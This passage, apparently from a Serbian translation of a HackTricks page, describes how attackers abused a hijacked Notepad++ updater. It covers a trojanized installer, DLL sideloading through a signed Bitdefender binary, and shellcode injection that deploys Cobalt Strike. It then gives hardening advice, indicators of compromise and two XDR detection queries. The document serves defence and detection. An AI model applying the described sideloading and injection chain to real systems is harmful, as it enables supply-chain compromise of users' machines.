2. **Trojanizovani NSIS**: installer preuzima/izvršava payload i zloupotrebljava dva lanca izvršavanja:
   - **Korišćenje sopstvenog potpisanog binarnog fajla + sideload**: isporučiti potpisani Bitdefender `BluetoothService.exe` i postaviti zlonamerni `log.dll` na njegovu putanju pretrage. Kada se potpisani binarni fajl pokrene, Windows učitava `log.dll` putem sideload-a; DLL dešifruje i reflektivno učitava Chrysalis backdoor (zaštićen Warbird-om + API hashing radi otežavanja statičkog otkrivanja).
   - **Ubacivanje shellcode-a putem skripte**: NSIS izvršava kompajliranu Lua skriptu koja koristi Win32 API-je (npr. `EnumWindowStationsW`) za ubacivanje shellcode-a i postavljanje Cobalt Strike Beacon-a.<sup>[[12]](#references)</sup>

Preporuke za ojačavanje bezbednosti/otkrivanje za sve programe za automatsko ažuriranje:
- Zahtevati **proveru sertifikata i potpisa** preuzetog instalera (vezati se za potpisnika proizvođača, odbaciti nepoklapanja CN-a/lanca) i potpisati sam manifest ažuriranja (npr. XMLDSig). Blokirati preusmeravanja koja kontroliše manifest ako nisu validirana.
- **Sideloading sopstvenog potpisanog binarnog fajla** tretirati kao tačku za otkrivanje nakon preuzimanja: upozoriti kada potpisani EXE proizvođača učita DLL čije se ime nalazi izvan zvanične putanje instalacije (npr. Bitdefender učita `log.dll` iz Temp/Downloads) i kada program za ažuriranje postavi/izvrši installere iz privremenih lokacija koji nemaju potpis proizvođača.
- Nadzirati **artefakte specifične za malware** uočene u ovom lancu (korisni kao opšte tačke pretrage): mutex `Global\Jdhfv_1.0.1`, neuobičajene upise `gup.exe` u `%TEMP%` i faze ubacivanja shellcode-a koje pokreće Lua.
- Notepad++ je odgovorio ojačavanjem WinGUp-a u verziji v8.8.9 i novijim: vraćeni XML je sada potpisan (XMLDSig), a novije verzije zahtevaju proveru sertifikata i potpisa preuzetog instalera umesto da se oslanjaju samo na transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading <code>log.dll</code> uz Bitdefender-potpisani EXE (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalacioni program koji nije za Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ovi obrasci primenljivi su na svaki updater koji prihvata nepotpisane manifeste ili ne proverava potpisnike instalera — otmica mrežnog saobraćaja + zlonamerni instalater + BYO-signed sideloading omogućavaju daljinsko izvršavanje koda pod maskom „pouzdanih” ažuriranja.

---
## References
- [1] [Savetodavno obaveštenje – Netskope Client za Windows – Local Privilege Escalation putem lažnog servera (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope bezbednosno savetodavno obaveštenje NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope dodatak](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC klijent/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation putem upisivih fajlova u Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – eskalacija privilegija u Windows agentu](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – akteri koje podržavaju države iskorišćavaju Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ažuriranje o incidentu sa otetom infrastrukturom](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Zaobilaženje ispravke za CVE-2025-0309 u Netskope Client za Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Otkrivanje grešaka u eskalaciji privilegija u Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: od gRPC-a do SYSTEM-a](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
